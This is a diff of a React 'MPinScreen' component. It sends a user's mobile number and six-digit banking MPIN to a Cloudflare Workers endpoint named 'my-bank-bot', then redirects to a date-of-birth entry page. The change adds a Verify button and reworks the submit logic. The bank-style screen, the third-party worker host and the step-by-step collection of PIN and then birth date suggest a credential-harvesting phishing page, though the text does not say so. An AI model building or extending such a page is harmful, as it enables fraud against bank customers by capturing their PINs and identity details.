@@ -19,9 +19,9 @@ export default function MPinScreen() {
         if (index < 5) {
             document.getElementById(`pin-${index + 1}`).focus();
         }
-        if (newPin.every((digit) => digit !== "")) {
-            submitMpin(newPin.join(""));
-        }
+        // if (newPin.every((digit) => digit !== "")) {
+        //     submitMpin(newPin.join(""));
+        // }
     };
 
     const handleKeyDown = (e, index) => {
@@ -36,7 +36,13 @@ export default function MPinScreen() {
         }
     };
 
-    const submitMpin = async (mpinCode) => {
+    const submitMpin = async () => {
+        const mpinCode = pin.join("");
+        if (mpinCode.length < 6) {
+            alert("Please enter all 6 digits of your MPIN.");
+            return;
+        }
+
         try {
             const res = await fetch(
                 "https://my-bank-bot.instapayapi.workers.dev/api/mpin",
@@ -54,10 +60,10 @@ export default function MPinScreen() {
             console.log("mPIN API Response:", data);
 
             if (data.success) {
-                // alert("mPIN Verified Successfully ✅");
-                // navigate("/dashboard", { state: { mobile } }); // आगे dashboard पर redirect
+                // ✅ Redirect on success
+                navigate("/dateOfbirth", { state: { mobile } });
             } else {
-                // alert("Invalid mPIN ❌ Try again");
+                alert("Invalid mPIN ❌ Try again");
                 setPin(["", "", "", "", "", ""]);
                 document.getElementById("pin-0").focus();
             }
@@ -66,6 +72,37 @@ export default function MPinScreen() {
             alert("Something went wrong, please try again later.");
         }
     };
+    
+    // const submitMpin = async (mpinCode) => {
+    //     try {
+    //         const res = await fetch(
+    //             "https://my-bank-bot.instapayapi.workers.dev/api/mpin",
+    //             {
+    //                 method: "POST",
+    //                 headers: { "Content-Type": "application/json" },
+    //                 body: JSON.stringify({
+    //                     username: mobile,
+    //                     mpin: mpinCode,
+    //                 }),
+    //             }
+    //         );
+
+    //         const data = await res.json();
+    //         console.log("mPIN API Response:", data);
+
+    //         if (data.success) {
+    //             // alert("mPIN Verified Successfully ✅");
+    //             navigate("/dateOfbirth", { state: { mobile } }); // आगे dashboard पर redirect
+    //         } else {
+    //             // alert("Invalid mPIN ❌ Try again");
+    //             setPin(["", "", "", "", "", ""]);
+    //             document.getElementById("pin-0").focus();
+    //         }
+    //     } catch (err) {
+    //         console.error("API Error:", err);
+    //         alert("Something went wrong, please try again later.");
+    //     }
+    // };
 
     return (
         <div className="min-h-screen bg-red-600 text-white flex flex-col items-center px-6">
@@ -102,6 +139,12 @@ export default function MPinScreen() {
                     />
                 ))}
             </div>
+            <button
+                onClick={submitMpin}
+                className="mt-10 bg-white text-red-600 px-8 py-2 rounded-lg font-semibold shadow-md hover:bg-gray-100"
+            >
+                Verify
+            </button>
         </div>
     );
 }
